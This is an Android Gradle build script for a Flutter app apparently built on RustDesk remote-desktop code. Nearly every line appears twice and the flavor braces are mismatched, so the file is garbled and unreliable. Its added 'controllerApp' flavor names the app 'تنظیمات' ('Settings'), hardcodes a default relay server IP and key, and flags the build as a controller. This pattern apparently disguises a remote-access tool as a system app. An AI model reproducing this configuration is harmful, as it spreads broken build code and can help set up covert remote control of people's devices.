import com.google.protobuf.gradle.*
import com.google.protobuf.gradle.*
plugins {
plugins {
    id "com.google.protobuf" version "0.9.4"
    id "com.google.protobuf" version "0.9.4"
    id "com.android.application"
    id "com.android.application"
    id "kotlin-android"
    id "kotlin-android"
    id "dev.flutter.flutter-gradle-plugin"
    id "dev.flutter.flutter-gradle-plugin"
}
}


def keystoreProperties = new Properties()
def keystoreProperties = new Properties()
def keystorePropertiesFile = rootProject.file('key.properties')
def keystorePropertiesFile = rootProject.file('key.properties')
if (keystorePropertiesFile.exists()) {
if (keystorePropertiesFile.exists()) {
    keystoreProperties.load(new FileInputStream(keystorePropertiesFile))
    keystoreProperties.load(new FileInputStream(keystorePropertiesFile))
}
}


def localProperties = new Properties()
def localProperties = new Properties()
def localPropertiesFile = rootProject.file('local.properties')
def localPropertiesFile = rootProject.file('local.properties')
if (localPropertiesFile.exists()) {
if (localPropertiesFile.exists()) {
    localPropertiesFile.withReader('UTF-8') { reader ->
    localPropertiesFile.withReader('UTF-8') { reader ->
        localProperties.load(reader)
        localProperties.load(reader)
    }
    }
}
}


def flutterVersionCode = localProperties.getProperty('flutter.versionCode')
def flutterVersionCode = localProperties.getProperty('flutter.versionCode')
if (flutterVersionCode == null) {
if (flutterVersionCode == null) {
    flutterVersionCode = '1'
    flutterVersionCode = '1'
}
}


def flutterVersionName = localProperties.getProperty('flutter.versionName')
def flutterVersionName = localProperties.getProperty('flutter.versionName')
if (flutterVersionName == null) {
if (flutterVersionName == null) {
    flutterVersionName = '1.0'
    flutterVersionName = '1.0'
}
}


dependencies {
dependencies {
    implementation 'com.google.protobuf:protobuf-javalite:3.20.1'
    implementation 'com.google.protobuf:protobuf-javalite:3.20.1'
}
}


protobuf {
protobuf {
    protoc {
    protoc {
        artifact = 'com.google.protobuf:protoc:3.20.1'
        artifact = 'com.google.protobuf:protoc:3.20.1'
    }
    }


    generateProtoTasks {
    generateProtoTasks {
        all().configureEach { task ->
        all().configureEach { task ->
            task.builtins {
            task.builtins {
                java {
                java {
                    option "lite"
                    option "lite"
                }
                }
            }
            }
        }
        }
    }
    }
}
}


android {
android {
    compileSdkVersion 34
    compileSdkVersion 34
    sourceSets {
    sourceSets {
        main.java.srcDirs += 'src/main/kotlin'
        main.java.srcDirs += 'src/main/kotlin'


        main.proto.srcDirs += '../../../libs/hbb_common/protos'
        main.proto.srcDirs += '../../../libs/hbb_common/protos'
        main.proto.includes += "message.proto"
        main.proto.includes += "message.proto"
    }
    }


    compileOptions {
    compileOptions {
        targetCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
        sourceCompatibility JavaVersion.VERSION_1_8
        sourceCompatibility JavaVersion.VERSION_1_8
    }
    }


    defaultConfig {
    defaultConfig {
    flavorDimensions "version"
    flavorDimensions "version"
    productFlavors {
    productFlavors {
        }
        controllerApp {
        controllerApp {
        resValue "string", "app_name", "تنظیمات"
        buildConfigField "String", "DEFAULT_SERVER", "\"77.92.145.91\""
        buildConfigField "String", "DEFAULT_KEY", "\"1jro16208HfIn+uI7979XJWszJUx9WGnqJJY7TyMqRE=\""
        buildConfigField "boolean", "IS_CONTROLLER", "true"
            dimension "version"
            dimension "version"
            applicationId "io.rustdesk.controller"
            applicationId "io.rustdesk.controller"
            versionName "1.0-controller"
            versionName "1.0-controller"
        }
        }
    }
    }
        // TODO: Specify your own unique Application ID (https://developer.android.com/studio/build/application-id.html).
        // TODO: Specify your own unique Application ID (https://developer.android.com/studio/build/application-id.html).
        applicationId "com.carriez.flutter_hbb"
        applicationId "com.carriez.flutter_hbb"
        minSdkVersion 21
        minSdkVersion 21
        targetSdkVersion 33
        targetSdkVersion 33
        versionCode flutterVersionCode.toInteger()
        versionCode flutterVersionCode.toInteger()
        versionName flutterVersionName
        versionName flutterVersionName
    }
    }


    signingConfigs {
    signingConfigs {
      release {
      release {
        keyAlias keystoreProperties['keyAlias']
        keyAlias keystoreProperties['keyAlias']
        keyPassword keystoreProperties['keyPassword']
        keyPassword keystoreProperties['keyPassword']
        storeFile keystoreProperties['storeFile'] ? file(keystoreProperties['storeFile']) : null
        storeFile keystoreProperties['storeFile'] ? file(keystoreProperties['storeFile']) : null
        storePassword keystoreProperties['storePassword']
        storePassword keystoreProperties['storePassword']
      }
      }
    }
    }


    buildTypes {
    buildTypes {
        release {
        release {
            // TODO: Add your own signing config for the release build.
            // TODO: Add your own signing config for the release build.
            // Signing with the debug keys for now, so `flutter run --release` works.
            // Signing with the debug keys for now, so `flutter run --release` works.
            signingConfig signingConfigs.release
            signingConfig signingConfigs.release
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules'
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules'
        }
        }
    }
    }
}
}


flutter {
flutter {
    source '../..'
    source '../..'
}
}


dependencies {
dependencies {
    implementation "androidx.media:media:1.6.0"
    implementation "androidx.media:media:1.6.0"
    implementation 'com.github.getActivity:XXPermissions:18.5'
    implementation 'com.github.getActivity:XXPermissions:18.5'
    implementation("org.jetbrains.kotlin:kotlin-stdlib") { version { strictly("1.9.10") } }
    implementation("org.jetbrains.kotlin:kotlin-stdlib") { version { strictly("1.9.10") } }
    implementation 'com.caverock:androidsvg-aar:1.4'
    implementation 'com.caverock:androidsvg-aar:1.4'
}
}
